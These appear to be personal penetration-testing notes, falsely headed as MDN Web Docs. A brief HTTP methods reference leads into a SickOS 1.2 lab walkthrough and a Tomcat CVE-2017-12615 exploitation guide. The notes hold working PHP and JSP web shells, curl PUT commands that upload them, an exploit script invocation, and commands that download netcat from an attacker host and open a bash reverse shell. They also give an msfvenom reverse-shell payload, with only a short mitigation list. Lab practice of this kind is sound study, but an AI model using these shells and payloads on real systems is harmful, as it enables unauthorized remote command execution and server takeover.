# HTTP Methods

**Source:** MDN Web Docs

---

## Overview

| Method | Description | Typical Use Case | Common Headers |
|------|------------|------------------|----------------|
| **GET** | Requests a representation of the specified resource. Should only retrieve data. | Fetching webpages, downloading images, accessing API resources. | `Accept`, `User-Agent`, `Cookie` |
| **HEAD** | Same as GET, but without the response body. | Checking metadata (`Last-Modified`, `ETag`). | `Accept`, `User-Agent`, `If-Modified-Since` |
| **POST** | Submits data to the server, creating or modifying resources. | Form submission, file upload, API requests. | `Content-Type`, `Content-Length` |
| **PUT** | Replaces the current representation of the target resource. | Uploading a complete resource. | `Content-Type`, `Authorization` |
| **DELETE** | Deletes the specified resource. | Removing a resource via API. | `Authorization` |
| **PATCH** | Applies partial modifications to a resource. | Updating specific fields. | `Content-Type`, `Authorization` |
| **CONNECT** | Establishes a tunnel to the server. | HTTPS through proxy. | `Host` |
| **OPTIONS** | Describes communication options for the target resource. | Checking allowed HTTP methods. | `Allow`, `Access-Control-Allow-Methods` |
| **TRACE** | Performs a message loop-back test. | Debugging requests. | None |

---

## GET

Requests a representation of the specified resource.  
Should only retrieve data and must not have side effects.

    curl -X GET http://example.com/resource

## HEAD
Same as GET but without the response body.

    curl -I http://example.com/resource

## POST
Used to submit data to the server, often causing a state change.

    curl -X POST -d "param1=value1&param2=value2" http://example.com/resource

## PUT
Replaces all current representations of the target resource.

    curl -X PUT -d "new data" http://example.com/resource

## DELETE
Deletes the specified resource.

    curl -X DELETE http://example.com/resource

## PATCH
Applies partial modifications to a resource.

    curl -X PATCH -d "param=new_value" http://example.com/resource

## CONNECT
Establishes a tunnel to the server (typically HTTPS via proxy).

Usually not invoked directly using curl.

## OPTIONS
Returns communication options for the target resource.

    curl -X OPTIONS http://example.com/resource -i

## TRACE
Performs a loop-back test to see what intermediaries see.

    curl -X TRACE http://example.com/resource

## SickOS: 1.2

- VulnHub Link:
https://www.vulnhub.com/entry/sickos-12,144/


- This is a vulhub machine called SickOS on running NMAP we will get to knoe that its running http Lighttpd 1.4.x Search for the exploitation on google or follow the sir method, so first we run

      dirsearch -u http://192.168.1.202

- We found an end point test 
- now we try to create a file using curl
- we used differnet methods
- PUT method worked
- We created a file having php reverse shell payload.
- run nc -nlvp 443 and got the shell



### Checking HTTP Methods
Using Nmap

    nmap -v -Pn -sT -sV -p 80 --script http-methods.nse 192.168.56.108

## With URL Path

    nmap -v -Pn -sT -sV -p 80 \
    --script http-methods.nse \
    --script-args http-methods.url-path='/test' \
    192.168.1.202

### Using curl (OPTIONS)

    curl -v -X OPTIONS http://192.168.1.202/test

### Example Usage with curl

### GET
    curl -X GET http://192.168.1.204/test/demo.txt

### HEAD

    curl -I http://192.168.1.204/test/demo.txt

### POST

    curl --request POST \
    --url http://192.168.1.204/test/post.php \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --data 'demo2'

### PUT ‚Äì Upload a File

    curl -T php-reverse-shell.php http://192.168.1.150/test/

### Explicit PUT

    curl -X PUT -T php-reverse-shell.php http://192.168.1.210/test/

Reference:
https://github.com/pentestmonkey/php-reverse-shell

### Upload as Data

    curl -X PUT -d "<?php phpinfo(); ?>" http://192.168.1.150/test/phpinfo.php

### DELETE ‚Äì Remove a Resource

    curl -X DELETE http://192.168.1.150/test/demo.txt

### Example PHP File Upload Form
 
      <!doctypehtml>
    <html>
    <head>
    <title>Form - Fileupload</title>
    </head>
    <body>
    
    <form action="fileupload.php" enctype="multipart/form-data" method="post">
    Select File to Upload:<br>
    <input name="filetoupload" type="file"><br>
    <input name="submit" type="submit" value="Upload"><br>
    </form>
    
    <?php
    if (isset($_POST['submit'])) {
    
        $file_name = $_FILES['filetoupload']['name'];
        $file_type = $_FILES['filetoupload']['type'];
        $file_tmp_name = $_FILES['filetoupload']['tmp_name'];
        $file_error = $_FILES['filetoupload']['error'];
        $file_size = $_FILES['filetoupload']['size'];
    
        echo "File Name = {$file_name} <br />";
        echo "File Type = {$file_type} <br />";
        echo "File Tmp Name = {$file_tmp_name} <br />";
        echo "File Error = {$file_error} <br />";
        echo "File Size = {$file_size} <br />";
    
        if (move_uploaded_file($file_tmp_name, $file_name)) {
            echo "File Uploaded Successfully";
        } else {
            echo "Could not Upload file";
        }
    }
    ?>
    </body>
    </html>

## PHP Reverse Shell Upload Example

For uploading a simple PHP backdoor:

    curl --request PUT --url http://192.168.1.150/test/shell.php \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --data '<?php if(isset($_REQUEST["cmd"])) { echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; die; } ?>'

### Usage

    http://target.com/shell.php?cmd=cat+/etc/passwd

### Example POST-based Command Shell

#### shell-post.php

    <!doctypehtml>
    <html>
    <head>
    <title>CMD Shell with POST</title>
    </head>
    <body>
    
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
    CMD:<br>
    <input name="cmd" type="text"><br>
    <input name="submit" type="submit" value="cmd"><br>
    </form>
    
    <?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>";
        system($_REQUEST['cmd']);
        echo "</pre>";
        die;
    }
    ?>
    </body>
    </html>

## Conclusion

- You explored HTTP methods: GET, POST, PUT, DELETE, etc.
- Enumerated allowed methods using nmap and curl.
- Used PUT to upload shells or files.
- Demonstrated file upload forms and simple backdoors.

# Tomcat ‚Äì Arbitrary File Write via HTTP PUT
Tomcat Arbitrary File Write via HTTP PUT
- CVE-2017-12615
- Vulnerability Reference (VulnHub Lab):
 https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615

Apache Tomcat versions 7.0.0‚Äì7.0.79 are vulnerable when:

- readonly=false is set on the default servlet
- HTTP PUT is enabled
This allows arbitrary file upload, leading to RCE by uploading a JSP web shell.

### Environment Setup (VulnHub Lab)

    cd /opt/vulhub/tomcat/CVE-2017-12615
    docker compose build
    docker compose up -d

Verify service:

    netstat -nltup

Expected:

    Tomcat listening on 8080

## HTTP Methods Enumeration
### Using Nmap

    nmap -v -Pn -sT -sV -p 8080 \
    --script http-methods.nse \
    --script-args http-methods.url-path=/ \
    192.168.1.220

Without specifying path:

    nmap -v -Pn -sT -sV -p 8080 \
    --script http-methods.nse \
    192.168.1.220

#### Look for:

- PUT
- DELETE
- OPTIONS

### Using curl (OPTIONS request)
    curl -v -X OPTIONS http://192.168.1.220:8080

If PUT is present, the server is likely exploitable.


## Tomcat Arbitrary File Write via HTTP PUT (CVE-2017-12615)

This document demonstrates HTTP method enumeration, arbitrary file upload, and remote code execution (RCE) via HTTP PUT on vulnerable Apache Tomcat servers.

### üìå Vulnerability Overview

- CVE: CVE-2017-12615
- Affected Versions: Apache Tomcat 7.0.0 ‚Äì 7.0.79
- Root Cause:
    - readonly=false on the default servlet
    - HTTP PUT method enabled
- Impact: Arbitrary file upload ‚Üí JSP execution ‚Üí Remote Code Execution

### üß™ Exploiting the Vulnerability (Python PoC)
 Run the exploit script

    python 42966.py -u http://192.168.1.103:8080 -pwn pwn


Attempts to upload a JSP file and confirm write access.

### üìÇ JSP File Upload & Execution
Create a Test JSP (test.jsp)

    vim test.jsp

    <%
    out.write("<html><body><h3>[+] JSP uploaded successfully via HTTP PUT.</h3></body></html>");
    %>

#### Upload via HTTP PUT

‚ö†Ô∏è Important: The trailing / is required.

    curl -X PUT http://192.168.1.103:8080/test.jsp/ \
    -d @- < test.jsp

#### Access the Uploaded JSP

    curl http://192.168.1.103:8080/test.jsp


‚úÖ If rendered, JSP execution is confirmed.

### üíª Remote Command Execution via JSP
Create Command Execution JSP (cmd.jsp)

    <%@ page import="java.util.*,java.io.*" %>
    <html><body>
    <h3>JSP Command Execution</h3>
    
    <form method="POST">
    <input type="text" name="cmd">
    <input type="submit" value="Execute">
    </form>
    
    <pre>
    <%
    if (request.getParameter("cmd") != null) {
        String cmd = request.getParameter("cmd");
        out.println("Command: " + cmd + "\n");
    
        Process p;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
        } else {
            p = Runtime.getRuntime().exec(cmd);
        }
    
        BufferedReader br = new BufferedReader(
            new InputStreamReader(p.getInputStream())
        );
    
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
    }
    %>
    </pre>
    </body></html>

### Upload the JSP Web Shell

    curl -X PUT http://192.168.1.103:8080/cmd.jsp/ \
    -d @- < cmd.jsp

###  Access the Web Shell
http://192.168.1.103:8080/cmd.jsp

### üßæ Example Commands (via Web Shell)

    ls -lha /tmp

    wget http://192.168.1.6/nc64 -O /tmp/nc64

    chmod +x /tmp/nc64

    /tmp/nc64 -e /bin/bash 192.168.1.6 443

## üîÅ Reverse Shell via JSP (Metasploit)
Generate JSP Reverse Shell

    msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=192.168.1.6 \
    LPORT=443 \
    -f raw > shell.jsp

### Upload the Reverse Shell

    curl -X PUT http://192.168.1.103:8080/shell.jsp/ \
    -d @- < shell.jsp

### Trigger the Reverse Shell
    http://192.168.1.103:8080/shell.jsp


Ensure a listener is running on your attacker machine.

### ‚ö†Ô∏è Key Notes & Gotchas

- Trailing / after .jsp is mandatory
- Upload path must be writable by Tomcat
- Default servlet must have:
- readonly=false

Fixed in Tomcat ‚â• 7.0.80

### üõ°Ô∏è Mitigation & Defensive Recommendations

- Disable HTTP PUT unless explicitly required
- Set readonly=true on the default servlet
- Restrict upload directories
- Monitor anomalous PUT requests (WAF / IDS)

Keep Tomcat fully patched

### ‚úÖ Conclusion

- Enumerated HTTP methods (PUT, DELETE, OPTIONS)
- Exploited arbitrary file upload via PUT
- Achieved JSP execution and RCE
- Demonstrated reverse shell access
